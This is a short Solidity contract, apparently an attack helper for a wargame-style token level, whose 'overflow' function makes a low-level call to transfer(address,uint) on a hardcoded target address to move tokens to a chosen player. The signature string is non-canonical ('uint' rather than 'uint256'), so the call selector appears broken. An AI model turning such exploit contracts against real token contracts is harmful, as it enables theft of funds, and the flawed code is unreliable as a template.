// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Token {

    address target = 0x28651c8Cc33432Bb7C7120FB712c28e0A8C9eAF5;

    function overflow(address player, uint value) public {
        bytes memory payload = abi.encodeWithSignature("transfer(address,uint)", player, value);
        (bool success, bytes memory result) = target.call(payload);
        
        assert(success);
        assert(uint8(result[result.length - 1]) > 0);
    }

}